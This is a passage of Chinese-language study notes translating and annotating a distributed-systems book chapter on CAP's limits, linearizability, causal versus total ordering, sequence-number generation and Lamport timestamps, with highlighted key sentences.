<p>CAP 最初被提出只是一个为了激发数据库取舍讨论的模糊的取舍参考，而非被精确定义的定理，Martin 还专门写过一篇<a href="https://www.qtmuniao.com/2020/02/16/not-cp-or-ap/"><strong>文章</strong></a>来探讨这件事。在当时，很多分布式数据库还在着眼于基于共享存储的一组机器上提供线性一致性语义。CAP 的提出，鼓励工程师们在 share-nothing 等更广阔的设计领域进行架构探索，以找出更加适合大规模可扩展 web 服务架构。在新世纪的最初十年里，<mark style="background: #BBFABBA6;">CAP 的提出见证并推动了当时数据库设计思潮从强一致系统转向弱一致系统</mark>（也被称为 NoSQL 架构）。</p>
<blockquote>
<p>CAP 定理没有帮助</p>
<p>CAP 有时候被表述为，在做系统设计时，一致性（consistency）、可用性（Availability）、分区容错性（Partition tolerance），只能三取其二。然而，<mark style="background: #FFF3A3A6;">这种说法极具误导性，因为网络分区是一种故障类型，而不是一种可以取舍的选项：不管你喜欢还是不喜欢，它都会出现</mark>。当然，也有人理解为用单机系统可以规避，但我们当下讨论的前提是分布式系统。</p>
<p><mark style="background: #BBFABBA6;"> 在网络正常连通时，系统可以同时提供一致性（线性一致性）和完全的可用性</mark>。当网络故障发生时，你必须在线性一致性和完全可用性之间二选一。因此，<mark style="background: #BBFABBA6;">对于 CAP 更好的一个表述可能是：当网络出现分区时，一致性和可用性只能二选其一</mark>（either Consistent or Available when Partitioned）。一个可靠的网络，可以减少其上的系统该选择的次数，但无论如何，<mark style="background: #FFF3A3A6;">分布式系统中，该选择是无法避免的</mark>。</p>
<p>在有关 CAP 的讨论，有几种关于可用性的大相径庭的定义，且将 CAP 升格为定理并给出证明中的提到的形式化的可用性并非通常意义中所说的可用性。<mark style="background: #FFF3A3A6;">很多所谓 “高可用” 的系统通常并不符合 CAP 定理中关于可用性的独特（idiosyncratic）定义</mark>。总而言之，CAP 有很多容易误解和模糊不清的概念，并不能帮助我们更好的理解系统，因此最好不用 CAP 来描述一个系统。</p>
</blockquote>
<p><strong>CAP 定理</strong>的形式化定义适用范围很窄：仅包含一种一致性模型（即线性一致性）和一种故障类型（网络分区，或者说节点存活，但互不连通）。它没有进一步说明任何关于网络延迟、宕机节点、以及其他的一些取舍考量。因此，尽管 CAP 在历史上很有影响力，但他在设计系统时缺乏实际有效指导力。</p>
<p>在分布式系统中有很多其他难以兼顾的有趣结果，CAP 现在已经被很多更为精确的描述所取代，因此 CAP 在今天更多的作为一个历史名词。</p>
<h4 id="线性一致性和网络延迟"><strong>线性一致性和网络延迟</strong></h4>
<p>尽管线性一致性是一个非常有用的保证，但令人惊讶的是在工程实践中，很少有系统支持真正的线性一致。甚而，即使在现代<mark style="background: #FFF3A3A6;">多核 CPU 体系下的 RAM 也不是线性一致的</mark>：如果一个核上的某个线程往某个内存地址中写了一个值，稍后另外核的一个线程读取该地址，并不一定能读到刚才的值（除非使用了 &nbsp;<strong>内存屏障（memory barrier）</strong>&nbsp; 或 &nbsp;<strong>围栏（fence）</strong>。</p>
<p>这是因为每个 CPU 都有自己的缓存（memory cache）和缓冲区（store buffer）。一般缓存通常说的是读取，而缓冲区通常针对写入。线程的内存访问会首先落到缓存里，所有对于缓存的更新会<strong>异步同步</strong>到主存中。缓存访问的速度要（ns 级别）比内存访问（百 ns 级别）快几个数量级，由于可以用来弥合寄存器和主存的访问鸿沟，因此是现代 CPU 架构高性能的基石。但<mark style="background: #FFF3A3A6;">一份数据存了多个副本（主存、 CPU 缓存），且是异步更新的，导致线性一致性被破坏</mark>。</p>
<p>为什么要做这个权衡？<mark style="background: #FFF3A3A6;">对多核内存一致性模型而言，CAP 定理是没有意义的</mark>：<mark style="background: #BBFABBA6;">在同一台计算机中，我们通常假定通信都是可靠的</mark>。并且我们并不指望一个 CPU 核能在脱离计算机其他部分的条件下继续正常工作。<mark style="background: #BBFABBA6;">牺牲线性一致性的原因是 &nbsp;<strong>性能（performance）</strong>，而不是容错</mark>。当然，单机系统都会提供一些同步手段（比如锁），来强制同步相应变量到主存。从而允许用户在关心一致性超过性能的地方，自行进行取舍。</p>
<p>许多分布式数据库也是如此：它们是 &nbsp;<strong><mark style="background: #BBFABBA6;">为了提高性能</mark></strong>&nbsp; 而选择了牺牲线性一致性，而不是为了容错。线性一致的速度很慢 —— 这始终是事实，而不仅仅是网络故障期间。</p>
<p>我们能找到一种<strong>更高效的实现</strong>来让存储服务提供线性一致吗？遗憾的是，暂时没有。Attiya 和 Welch 证明了，<mark style="background: #FFF3A3A6;">如果你想要保证线性一致，读写请求的响应时间是<strong>正比于网络延迟</strong>的</mark>。在一个具有高度不确定性的网络中（参见<strong>超时和无界延迟</strong>），线性化的读写请求的响应时间不可避免的会很高。提供线性一致性保证可能没有更快的算法，但是我们稍微<strong>放松一致性</strong>，就可以设计出一个更快的系统。这种取舍在对延迟敏感的系统非常重要。在第十二章中，我们会探讨一些即使不提供线性一致性，但仍然可以保证正确性的一些方法。</p>
<h2 id="顺序保证"><strong>顺序保证</strong></h2>
<p>我们之前提到，一个线性化的寄存器对外表现得像：</p>
<ol type="1">
<li>数据只有一个副本</li>
<li>（施加于数据上的）操作原子的完成</li>
</ol>
<p>该定义暗含着：<strong><mark style="background: #BBFABBA6;">所有操作会形成一个确定的执行顺序</mark></strong>。在图 9-4 中，我们就根据读到的结果来推测出了一个服务器端所有操作的看起来的执行顺序。</p>
<p><strong>顺序</strong>（ordering）是本书中不断强调的一个主题，这也确实说明顺序是一个非常重要的基础概念。我们回忆一下本书所提到顺序的相关上下文：</p>
<ul>
<li>在<a href="https://ddia.qtmuniao.com/#/ch05"><strong>第五章</strong></a>，我们在单主模型中提到，<mark style="background: #BBFABBA6;">主副本最重要的作用就是确定<strong>复制日志</strong>（replication log）中的<strong>写入顺序</strong>（order of writes）</mark>，然后所有从副本都要遵从该顺序。如果不存在唯一的主节点作为权威来协调该顺序，则在并发的多个写入可能会产生冲突。（参见<a href="https://ddia.qtmuniao.com/#/ch05?id=%e5%a4%84%e7%90%86%e5%86%99%e5%85%a5%e5%86%b2%e7%aa%81"><strong>处理写入冲突</strong></a>）</li>
<li>在<a href="https://ddia.qtmuniao.com/#/ch07"><strong>第七章</strong></a>，我们讨论了<strong>可串行化</strong>（serializability），即保证所有<mark style="background: #FFF3A3A6;">并发的事务像以某种顺序一样串行执行</mark>（some sequential order）。可以通过物理上真的串行执行来实现，也可以通过并发执行但解决冲突（加锁互斥或者抛弃执行）来实现。</li>
<li>在<a href="https://ddia.qtmuniao.com/#/ch08"><strong>第八章</strong></a>，我们讨论了在分布式系统中使用时钟（参见<a href="https://ddia.qtmuniao.com/#/ch08?id=%e4%be%9d%e8%b5%96%e5%90%8c%e6%ad%a5%e6%97%b6%e9%92%9f%EF%BC%89"><strong>依赖同步时钟</strong></a>，这也是一个试图对无序的真实世界引入某种顺序，以解决诸如哪个写入更靠后之类的问题。</li>
</ul>
<p><strong>顺序性</strong>（ordering）、<strong>线性一致性</strong>（linearizability）和<strong>共识协议</strong>（consensus）三个概念间有很深的联系。相比本书其他部分，尽管这几个概念更偏理论和抽象，但理解他们却有助于来厘清系统的功能边界 —— 哪些可以做，哪些做不了。在接下来的几小节中，我们会对此进行详细探讨。</p>
<h3 id="顺序和因果ordering-and-causality"><strong>顺序和因果（Ordering and Causality）</strong></h3>
<p>顺序在本书中反复被提及的原因有很多，其中一个是：<strong>它可以维持因果性</strong>。关于因果关系的重要性，本书也举过很多例子：</p>
<ul>
<li>在<a href="https://ddia.qtmuniao.com/#/ch05?id=%e4%b8%80%e8%87%b4%e5%89%8d%e7%bc%80%e8%af%bb"><strong>一致前缀读</strong></a>中我们提到一个先看到答案、后看到问题的例子。这种现象看起来很奇怪，是因为它违反了我们关于因果顺序的直觉：问题应该先于答案出现。因为只有看到了问题，才可能针对其给出答案（假设这不是超自然现象，并且不能预言将来）。对于这种情况，我们说在<mark style="background: #BBFABBA6;">问题和答案之间存在着<strong>因果依赖</strong>（causal dependency）</mark>。</li>
<li>在第五章<a href="https://ddia.qtmuniao.com/#/ch05?id=%e5%a4%9a%e4%b8%bb%e5%a4%8d%e5%88%b6%e6%8b%93%e6%89%91"><strong>图 5-9</strong></a>&nbsp; 中有类似的情况，在有三个主的情况下，由于网络延迟，一些本应该先到的写入操作却居于后面。从某个副本的角度观察，就感觉像在更新一个不存在的数据。<strong>因果</strong>在此处意味着，<mark style="background: #FFF3A3A6;">某一行数据只有先被创建才能够被更新</mark>。</li>
<li>在<a href="https://ddia.qtmuniao.com/#/ch05?id=%e5%b9%b6%e5%8f%91%e5%86%99%e5%85%a5%e6%a3%80%e6%b5%8b"><strong>并发写入检测</strong></a>一节我们知到，对于两个操作 A 和 B，有三种可能性：A 发生于 B 之前，B 发生于 A 之前，A 和 B 是并发的。这种<strong>发生于之前</strong>（happened before）是因果性的另一种表现：如果 A 发生在 B 之前，则 B 有可能知道 A，进而基于 A 构建，或者说依赖于 A。如果 A 和 B 是并发的，则他们之间没有因果联系，也即，我们可以断定他们互不知道。</li>
<li>在事务的快照隔离级别下（参见<a href="https://ddia.qtmuniao.com/#/ch07?id=%e5%bf%ab%e7%85%a7%e9%9a%94%e7%a6%bb%e5%92%8c%e9%87%8d%e5%a4%8d%e8%af%bb"><strong>快照隔离和重复读</strong></a>），所有的读取都会发生在某个<strong>一致性</strong>的快照上。这里的一致性是什么意思呢？是<mark style="background: #BBFABBA6;">因果一致性</mark>（consistent with causality）。如果一个快照包含某个问题答案，它一定包含该问题本身。假设我们以上帝视角，在某个<strong>时间点</strong>（意味着瞬时观察完）观察整个数据库可以让得到的快照满足因果一致性：所有在该时间点之前操作结果都可见，在该时间点之后的操作结果都不可见。<strong>读偏序</strong>（Read skew，即图 7-6 中提到的不可重复读），即意味读到了违反因果关系的状态。</li>
<li>之前提到的事务间的<mark style="background: #FFF3A3A6;">写偏序</mark>的例子（参见<a href="https://ddia.qtmuniao.com/#/ch07?id=%e5%86%99%e5%81%8f%e5%ba%8f%e5%92%8c%e5%b9%bb%e8%af%bb"><strong>写偏序和幻读</strong></a>）<mark style="background: #FFF3A3A6;">本质上也是因果依赖</mark>：在图 7-8 中，系统允许 Alice 请假，是因为事务看到的 Bob 的状态是仍然再岗；当然，对于 Bob 也同样。在这个例子中，一个医生是否允许在值班时请假，依赖于当时是否仍有其他医生值班。在<strong>可串行的快照隔离级别</strong>（SSI，参见<a href="https://ddia.qtmuniao.com/#/ch07?id=%e5%8f%af%e4%b8%b2%e8%a1%8c%e7%9a%84%e5%bf%ab%e7%85%a7%e9%9a%94%e7%a6%bb"><strong>可串行的快照隔离</strong></a>) 下，我们通过追踪事务间的因果依赖（即读写数据集依赖）来检测写偏序。</li>
<li>在 Alice 和 Bob 看足球比赛的例子中，Bob 在 Alice 表示结果已经出来之后，仍然没有看到网页结果，便是违反了因果关系：Alice 的说法基于比赛结果已经出来的事实，因此 Bob 在听到 Alice 的陈述之后，应该当能看到比赛结果。图片尺寸调整的例子也是类似。</li>
</ul>
<p><mark style="background: #BBFABBA6;">因果关系对事件施加了一种 &nbsp; 顺序：因在果之前</mark>；消息发送在消息收取之前。而且就像现实生活中一样，一件事会导致另一件事：某个节点读取了一些数据然后写入一些结果，另一个节点读取其写入的内容，并依次写入一些其他内容，等等。这些因果依赖的操作链定义了系统中的因果顺序，即，什么在什么之前发生。</p>
<p>如果一个系统遵循因果约束，则我们称其为<strong>因果一致的</strong>（<em>causally consistent</em>）。比如，<mark style="background: #BBFABBA6;">快照隔离就可以提供因果一致性</mark>：当从数据库读取数据的时候，如果你能读到某个时间点的数据，就一定能读到其之前的数据（当然，要在该数据还没有被删除的情况下）。</p>
<h4 id="因果序非全序"><strong>因果序非全序</strong></h4>
<p><mark style="background: #BBFABBA6;"><strong>全序</strong>（total order）意味着<strong>系统内任意两个元素可比大小</strong></mark>。如，自然数是全序：任举两个自然数，比如 5 和 13，我们可以确定 13 是比 5 大的。但与此相对，数学中的集合就不是全序的，比如我们无从比较 {a, b} 和 {b, c} 的大小关系，因为他们互不为对方子集。对于这种情况，我们称其<strong>不可比</strong>（incomparable）。反之，<mark style="background: #FFF3A3A6;">集合是<strong>偏序</strong>（partially ordered）</mark>：在某些情况下，我们可以说一个集合比另一个集合大（两个集合间有包含关系）；但<mark style="background: #FFF3A3A6;">在另外一些情况下，两个集合间没有可比关系</mark>。</p>
<blockquote>
<p>设 R 为非空集合 A 上的关系，如果 R 是自反的、反对称的和可传递的，则称 R 为 A 上的偏序关系。简称偏序，通常记作 ≦。一个集合 A 与 A 上的偏序关系 R 一起叫作偏序集，记作 &nbsp;(𝐴,𝑅)(A,R)&nbsp; 或 &nbsp;(𝐴,≦)(A,≦)。全序、偏序、关系、集合，这些概念的精确定义可以参考任意一本离散数学教材。</p>
<p><a href="https://oi-wiki.org/math/order-theory/">序理论 - OI Wiki (oi-wiki.org)</a></p>
</blockquote>
<p>全序和偏序的区别还反应在不同强度<strong>数据库一致性模型</strong>（database consistency models）上：</p>
<ul>
<li><strong>线性一致性</strong>（Linearizability）：让我们回忆下对于可线性化的理解，可线性化对外表现的像<strong>所有操作都发生于单副本上，并且会原子性的完成</strong>。这就意味着，对于任意两个操作，我们总是可以确定其发生的先后关系，也即在可线性化系统中，所有的操作顺序满足全序关系。如之前图 9-4 中给的例子。</li>
<li><strong>因果一致性</strong>（Causality）：<mark style="background: #FFF3A3A6;">如果我们无从判定两个操作的先后关系，则称之为<strong>并发的</strong></mark>（concurrent，参见<a href="https://ddia.qtmuniao.com/#/ch05?id=%e5%8f%91%e7%94%9f%e4%ba%8e%e4%b9%8b%e5%89%8d%ef%bc%88happens-before%ef%bc%89%e5%92%8c%e5%b9%b6%e5%8f%91%e5%85%b3%e7%b3%bb"><strong>发生于之前和并发关系</strong></a>）。从另一个角度说，如果两个事件因果相关，则其一定有序。也即，因果性定义了一种<strong>偏序</strong>（partial order）关系，而非全序关系：有些操作存在因果，因此可比；而另外一些操作则是并发的，即不可比。</li>
</ul>
<p>根据上述解释，<mark style="background: #BBFABBA6;">在线性一致的数据存储服务中，是不存在并发操作的</mark>：<strong>因为必然存在一个时间线能将所有操作进行排序</strong>。同一时刻可能会有多个请求到来，但是<mark style="background: #BBFABBA6;">线性化的存储服务可以保证：<strong>所有请求都会在单个副本上、一个单向向前的时间线上的某个时间点被原子地处理，而没有任何并发</strong></mark>。</p>
<p><mark style="background: #FFF3A3A6;">并发（concurrency）意味着时间线的分叉与合并</mark>。但在重新合并之时，来自两个时间分支的操作就有可能出现不可比的情况。在第五章的图 5-14（参见<a href="https://ddia.qtmuniao.com/#/ch05?id=%e7%a1%ae%e5%ae%9a-happens-before-%e5%85%b3%e7%b3%bb"><strong>确定 Happens-Before 关系</strong></a>）中我们见过类似的现象，所有的事件不在一条时间线上，而是有相当复杂的图形依赖。图中的每个箭头，本质上定义了一种因果依赖，也即偏序关系。</p>
<blockquote>
<p>理解全序和偏序、线性一致性和因果一致性的一个关键模型是有向图。在该图中，点代表事件，有向边代表因果关系，并且从因事件指向果事件，很自然的，因果性满足传递性。如果该图中有一条单一的路径能串起所有点，且不存在环，则该系统是线性一致的。可以看出，因果关系是一种局部特性（也即偏序关系），定义在两个点之间（如果两个点之间存在着一条单向途径，则这两点有因果关系）；而线性关系是一种全局特性（也即全序关系），定义在整个图上。</p>
</blockquote>
<p>如果你熟悉一些分布式的版本管理工具，如 Git，你就会发现相似的特性。在 Git 中，版本间的依赖就类似于一个因果依赖图。大部分时候，所有人的提交（commit）是前后相继的，组成一个直线；但有时，如果团队中的几个人同时（并发的）为一个项目工作，版本历史就会产生分叉，并且在提交的时候重又合并。</p>
<blockquote>
<p>在 Spark 的多个 RDD 之间，也有类似的感觉。如果所有算子都是单输入算子，则执行图会是一条线，即全序没有并发；如果有的算子有多个输入，则不同输入之间可以并发，此时为偏序关系。</p>
</blockquote>
<h4 id="线性一致性强于因果一致性"><strong>线性一致性强于因果一致性</strong></h4>
<p>那么因果顺序和线性一致性的关系是什么？答曰：<mark style="background: #BBFABBA6;">线性一致性隐含（implies）因果一致性</mark>。所有提供线性一致性的系统都能够能够保证因果性。尤其对于有多个通信通道的系统来说，我们不需要做任何额外努力（比如在多个组件间传递时间戳，以建立因果关系），线性一致性就能够保证系统中发生的所有事件满足因果性。</p>
<blockquote>
<p>用我们之前的图模型来说，就是不存在环。即，因果一致性（有向无环图） ⇒&nbsp; 线性一致性（在有向无环图的基础上，存在一条能串起所有点的单向路径）。</p>
</blockquote>
<p>线性一致性能能够保证因果关系，该特点让系统易于使用，从而对应用层很有吸引力。但任何事情都是有代价的，如我们在之前线性一致性的代价一节中所讨论的：<strong><mark style="background: #FF5582A6;">提供线性一致性非常损害性能和可用性，尤其是在网络有显著延迟时</mark></strong>（如全球部署的系统）。因此，很多系统会舍弃线性一致性以换取更好的性能，但当然，代价是更难用了。</p>
<p>好消息是存在折中路线。<mark style="background: #FFF3A3A6;">线性一致性并非保持因果关系的唯一途径</mark>，还有很多其他办法。也即，一个系统可以不必承担线性一致性所带来的性能损耗，而仍然是<strong>因果一致的</strong>（consistent）。当然，在这种情况下，CAP 定理是不适用的。事实上，<mark style="background: #BBFABBA6;">在所有的不会被网络延迟拖慢的一致性模型中，因果一致性是可行的最强的一致性模型。而且在网络故障时仍能保持可用</mark>。</p>
<p>在大多数情况下，<mark style="background: #FFF3A3A6;">我们以为我们需要线性一致模型，其实我们只需要因果一致模型</mark>，而后者允许我们实现性能更好的系统。基于这个观察，研究人员在探寻新型数据库的设计，让系统既可以提供因果关系保证，也可以提供（堪比最终一致性系统的）高性能和高可用性。</p>
<p>这些研究都比较新，还存在很多挑战，也没有进行落地。但无疑，是分布式系统在将来一个很有前景发展方向。</p>
<blockquote>
<p>真实系统中，在所有的事件集中，只有部分事件是有因果依赖的，这些事件需要在执行时保证因果顺序执行；而其他的大部分事件是没有因果依赖的，因此可以乱序、按需执行以保证性能。但这件事情的难点在于，因果关系是应用层定义的。而我们在系统层，就很难识别。可能需要提供某种接口，可以让应用层显示指定因果，但一来不确定这种接口是否能做的足够宽泛；二来，这种因果追踪的额外代价是非常大的。</p>
</blockquote>
<h4 id="捕获因果依赖"><strong>捕获因果依赖</strong></h4>
<p>我们不会事无巨细的去探究非线性化系统如何保持因果关系的每个细节，仅就其中的一些关键点进行探讨。</p>
<p>为了保证因果一致性，我们首先需要知道哪些操作存在着因果关系。如之前所说，因果关系是偏序关系，有些操作是并发的，但如果确定某个操作发生在另外一个之前，则在所有的副本上都要以同样的顺序处理这两个操作。因此，<mark style="background: #BBFABBA6;">当某个副本处理一个操作时，它必须确保所有其前驱（happens before）操作都已经完成</mark>；如果有任何前驱操作还未出现，则之后的操作必须等待直到其被处理。</p>
<p>为了确定因果依赖，我们需要某种手段来描述系统中节点的 “<strong>知识</strong>”（knowledge）。如果某个节点在收到 Y 的写入请求时已经看到了值 X，则 X 和 Y 间可能会存在着因果关系。就如在调查公司的欺诈案时，CEO 常被问到，“你在做出 Y 决定时知道 X 吗”？</p>
<p>确定哪些操作先于哪些些操作发生的方法类似于我们在 “<a href="https://ddia.qtmuniao.com/#/ch05?id=%e5%b9%b6%e5%8f%91%e5%86%99%e5%85%a5%e6%a3%80%e6%b5%8b"><strong>并发写入检测</strong></a>” 一节讨论的技术。那一节针对无主模型讨论了如何检测针对单个 Key 的并发写入，以防止更新丢失问题。因果一致性所需更多：<strong><mark style="background: #FFF3A3A6;">需要在整个数据库范围内追踪所有 Key 间操作的因果依赖，而非仅仅单个 Key 上</mark></strong>。<strong>版本向量</strong>（version vectors）常用于此道。</p>
<p>为了解决确定因果顺序，数据库需要知道应用读取数据的<strong>版本信息</strong>。这也是为什么在图 5-13 中（参见 &nbsp;<a href="https://ddia.qtmuniao.com/#/ch05?id=%e7%a1%ae%e5%ae%9a-happens-before-%e5%85%b3%e7%b3%bb"><strong>确定 Happens-Before 关系</strong></a>），我们在写入数据时需要知道先前读取操作中数据库返回的版本号。在 SSI 的冲突检测（参见<a href="https://ddia.qtmuniao.com/#/ch07?id=%e5%8f%af%e4%b8%b2%e8%a1%8c%e7%9a%84%e5%bf%ab%e7%85%a7%e9%9a%94%e7%a6%bb"><strong>可串行的快照隔离</strong></a>）中也有类似的思想：当一个事务提交时，数据库需要检查其读取集合中的数据版本是否仍然是最新的。为此，数据库需要跟踪一个事务读取了哪些数据的哪些版本。</p>
<h3 id="序列号定序"><strong>序列号定序</strong></h3>
<p>理论上来说，因果关系很重要；但在实践中，<mark style="background: #FF5582A6;">追踪所有的因果依赖非常不切实际</mark>。在很多应用场景，客户端会先读取大量数据，才会进行写入。并且我们也无从得知，之后的写入和先前有没有关系，和哪些有关系。<strong>显式的追踪</strong>所有<strong>读集合</strong>所带来的开销会非常大。</p>
<p>不过，我们有一种更简单的手段：<strong><mark style="background: #BBFABBA6;">使用序列号（sequence numbers）或者时间戳（timestamps）来给事件定序</mark></strong>。我们不非得用物理时间戳（如日历时钟，time-of-day clock，参见<a href="https://ddia.qtmuniao.com/#/ch08?id=%e6%97%a5%e5%8e%86%e6%97%b6%e9%92%9f"><strong>日历时钟</strong></a>），而可以使用逻辑时钟（logic clock），即使用某种算法来产生一系列的数值以关联操作。最简单的，可以用一个计数器来递增地为每个操作安排一个序列号。</p>
<p>此种序列号和时间戳通常都非常紧凑，只占几个字节，但却能提供一种全序关系。通过给每个操作关联一个序列号，就能比较任何两个操作的先后关系。</p>
<p>进一步，我们可以保证我们产生序列号的方式满足因果关系：<strong><mark style="background: #FFF3A3A6;">如果操作 A 发生在 B 之前，则 A 获取到的序列号比 B 小</mark></strong>。并发的（无法比较谁先谁后）操作获取到的序列号顺序不确定。序列号本质上是一种全序，通过这种方式可以追踪因果关系，但也施加了一个比因果关系更为严格的全序。</p>
<blockquote>
<p>联想我们之前用以理解的有向图，相当于在满足原来有向边（因果关系）的基础上，增加了一些有向边，串出了一条能串起所有点（操作）的路径。</p>
</blockquote>
<p>在使用单主模型的多副本系统中，<mark style="background: #BBFABBA6;">主节点上<strong>操作日志的追加顺序</strong>确定了一个对所有操作的全序，且满足操作发生的因果关系</mark>。主节点可以为每条日志按顺序关联一个全局递增的序列号，如果从节点上也按都按此序列号顺序应用操作日志到状态机，则每个副本总能保持一致的状态（但有可能稍落后于主节点）。</p>
<h4 id="非因果序生成器"><strong>非因果序生成器</strong></h4>
<p>如果系统中没有唯一的单主节点（比如多主模型或无主模型，又或者你的系统存在多个分区），则如何为每个操作产生一个序列号就变得不那么简单直观了。常用的方式有以下几种：</p>
<ol type="1">
<li><strong>每个节点独立地生成不相交的序列集</strong>。如，你的系统中有两个节点，一个节点只产生奇数序号，另一个节点只产生偶数序号。更通用一些，可以<mark style="background: #BBFABBA6;">在生成的序号中保留一些位来编码对节点的标识，从而让不同的节点永远不会产生相同的序号</mark>。</li>
<li><strong>可以为每个操作关联一个日历时钟</strong>（或者说物理时钟）。这些时间戳不是有序的（因为回拨？），但如果有足够的精读，就可以让任意两个操作关联的时间戳不同，依次也可以达到全序的目的。此种方法有时候会被用在解决冲突使用后者胜的策略（但会有风险）。</li>
<li><strong>每次可以批量产生一组序列号</strong>。比如，在请求序列号时，节点 A 可以一次性声明占用 1 ~ 1000 的序列号，节点 B 会一次占用 1001~2000 的序列号。则本地的操作可以从拿到的这批序列号中直接分配，仅在快耗尽时再去请求一批。这种方法常被用在 TSO（timestamp oracle，单点授时）的优化中。</li>
</ol>
<p>这三种方案都要比使用单点计数器生成序列号要性能好、扩展性更强，且能为系统中的每个操作产生全局唯一的、<strong>近似递增</strong>的序列号。但他们都存在着同样的问题：<mark style="background: #FF5582A6;"><strong>产生的序列号不是因果一致的</strong></mark>。</p>
<p>由于这些序列号生成方法都<mark style="background: #FFF3A3A6;">不能正确地捕捉跨节点的操作因果关系</mark>，因此都存在因果问题：</p>
<ol type="1">
<li><strong>不同节点上处理操作的速率很难完全同步</strong>。因此，如果一个节点使用奇数序号，另一个节点时用偶数序号，则两个序号消耗的速率也会不一致。此时，当你有两个奇偶性不同的序号时，就难以通过比较大小来确定操作发生的先后顺序。</li>
<li><strong>物理时间戳会由于多机时钟偏差，而不满足因果一致</strong>。例如，在图 8-3 中（参见<a href="https://ddia.qtmuniao.com/#/ch08?id=%e6%97%b6%e9%97%b4%e6%88%b3%e4%bb%a5%e5%ae%9a%e5%ba%8f"><strong>时间戳以定序</strong></a>），就出现了<mark style="background: #FFF3A3A6;">发生在之后的操作被分配了一个较小的时间戳</mark>。</li>
<li>对于批量分配方式，有可能发生较早的操作被分配了 1001-2000 的序列号，而<mark style="background: #FFF3A3A6;">较晚的操作被分配了 1-1000 的序列号</mark>。如此一来，序列号的分配不满足因果一致。</li>
</ol>
<h4 id="lamport-时间戳"><strong>Lamport 时间戳</strong></h4>
<p>虽然上面的几种方式产生的序列号不满足因果一致性，但却有一种相对简洁的方式可以做到 ——&nbsp;<strong>Lamport 时间戳</strong>。它是由 Lesilie Lamport 在 1978 年提出的，是分布式领域被引用最多的论文之一。</p>
<p>下图展示了 Lamport 时间戳的使用方法。在该系统中，每个节点有一个唯一的 &nbsp;<strong>id</strong>&nbsp; 和一个记录处理过多少个操作的计数器，<mark style="background: #BBFABBA6;">Lamport 时间戳是二元组：<code>(counter, node ID)</code></mark>&nbsp;。不同的节点可能会有相同的 counter 值，但通过引入 node ID，可以使所有时间戳都是全局唯一的。</p>
<p><img src="ch09-fig08.png"></p>
<p>Lamport 时间戳不依赖于物理时钟，但可以提供全序保证，对于任意两个 Lamport 时间戳：</p>
<ol type="1">
<li>具有较大 counter 的时间戳较大</li>
<li> counter 相同，具有较大 node ID 的时间戳较大</li>
</ol>
<p>但到此为止，以上表述和之前提到的奇偶时间戳没有本质区别。让 Lamport 时间戳能够满足因果一致性的核心点在于：<mark style="background: #BBFABBA6;">每个节点和客户端都会让 counter 追踪当前所看到（包括本机的和通信的）的最大值</mark>。当节点看到请求或者回复中携带的 counter 值比自己大，就会立即用其值设置本地 counter。</p>
<p>如上图，客户端 A 在收到节点 2 的 counter = 5 的回复后，会使用该值向节点 1 发送请求。节点 1 本来的 counter 值是 1，在收到该请求后，会立即前移为 5。尔后，下一个请求操作到来会将其增加为 6。</p>
<blockquote>
<p>系统中所有的事件（event），和交互方（client，server）都要被纳入 Lamport Clock 体系内，才能追踪系统内的所有因果关系。</p>
</blockquote>
<p>只要最大的 counter 值通过每个操作被传播，就能保证 Lamport 时间戳满足因果一致：因为<mark style="background: #FFF3A3A6;">每次因果依赖的交互都会推高时间戳</mark>。</p>
<p>有时候我们会将 Lamport 时间戳和之前提到的<strong>版本向量</strong>（version vector，参见<a href="https://ddia.qtmuniao.com/#/ch05?id=%e5%b9%b6%e5%8f%91%e5%86%99%e5%85%a5%e6%a3%80%e6%b5%8b"><strong>并发写入检测</strong></a>）混淆。虽然看起来相似，但其根本目的却是不同：</p>
<ol type="1">
<li>版本向量能够用于检测操作的并发和因果依赖</li>
<li> Lamport 时间戳用于确定包含因果依赖的全序</li>
</ol>
<p>对于 2，虽然 Lamport 时间戳能够追踪因果关系，即具有因果关系中的 happens-before 关系。但是反过来，<mark style="background: #FF5582A6;">并不能通过两个 Lamport 时间戳的大小来判断其是有因果关系、还是并发的</mark>。但相对于版本向量，Lamport 时间戳占用空间小，更为紧凑。</p>
<h4 id="时间戳定序还不够"><strong>时间戳定序还不够</strong></h4>
<p>尽管 Lamport 时间戳能够给出一种能够追踪因果关系的全序时间戳生成算法，但并不足以解决分布式系统中所面临的的很多基本问题。</p>
<p>举个例子，考虑一个系统，在该系统中，以用户名唯一确定一个账户。如果两个用户并发的用同一个用户名创建账户，则一个成功，另一个失败。</p>
<p>第一感觉，对所有事件进行全序定序（如使用 Lamport 时间戳）能够解决该问题：如果系统收到两个具有相同用户名的账户创建请求，让具有较小时间戳的那个请求成功，让另一个失败。由于所有时间戳满足全序关系，这两个请求的时间戳总是可以比的。</p>
<p>该方法能够确定赢家基于一个隐藏假设：<strong>当你拿到系统中所有的账户创建操作后，你才可以比较他们的时间戳</strong>。然而，在收到某个账户创建请求时，<mark style="background: #FF5582A6;">系统中单个节点并不能<strong>立即独自的</strong>判断该请求成功还是失败</mark>。此时此刻，该节点并不知道其他节点是否收到了具有同样用户名的账户创建请求，以及其请求的时间戳是大还是小。</p>
<p>如果其他节点收到同名账户的创建请求，并且获得了较小的时间戳，本节点的创建请求就得失败。为了避免这一点，它需要不断和其他节点沟通，以知晓他们在做啥。但如果沟通时，其他节点宕机或者网络出现问题，则可能会导致系统陷入停顿而不能提供服务。这显然不符合我们对一个高可用系统的期望。</p>
<p>上述问题的核心在于，<mark style="background: #FFF3A3A6;">只有在收集到系统中所有操作之后，才能真正确定所有操作的全序</mark>。如果其他节点正在进行某些操作，但你并不知晓，也就自然不能确定最终的事件的全序：毕竟这些未知节点的操作可能被插入到不同位置。举个例子，本节点的事件顺序为 n1e1, n1e2, n1e3，另外一个节点有两个事件，顺序为 n2e1, n2e2，将两个序列进行合并时，会有多种可能的结果。这有点类似于多个并发事务中的读写序列定序。</p>
<p>小结一下，在分布式系统中，为了实现类似于针对用户名的<strong>唯一性约束</strong>，仅为所有时间进行全局定序是不够的，你还需要知道该定序何时完成。对于某个创建账户的操作，<mark style="background: #BBFABBA6;">如果我们能够确定在最终的全序里，不会有其他操作插到该操作之前，我们便可以安全的让该操作成功</mark>。</p>
<p>确定全局定序何时收敛，将会在接下来的小节 ——&nbsp;<strong>全序广播</strong>（<em>total order broadcast</em>）中讨论。</p>
<h3 id="全序广播"><strong>全序广播</strong></h3>
